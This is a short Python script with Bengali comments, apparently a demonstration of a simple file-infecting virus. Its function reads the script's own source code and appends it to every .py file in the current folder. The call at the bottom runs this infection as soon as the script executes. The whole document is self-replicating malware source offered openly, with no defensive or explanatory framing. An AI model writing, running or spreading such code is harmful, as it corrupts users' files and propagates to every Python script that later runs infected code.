import os

# ফাইলের ভিতরে নিজেকে কপি করা
def infect(target_folder):
    virus_code = open(__file__, "r").read()
    for file in os.listdir(target_folder):
        if file.endswith(".py"):
            with open(file, "a") as f:
                f.write("\n" + virus_code)

infect(".")  # নিজের ফোল্ডারেই সব .py ফাইলে নিজেকে কপি করবে
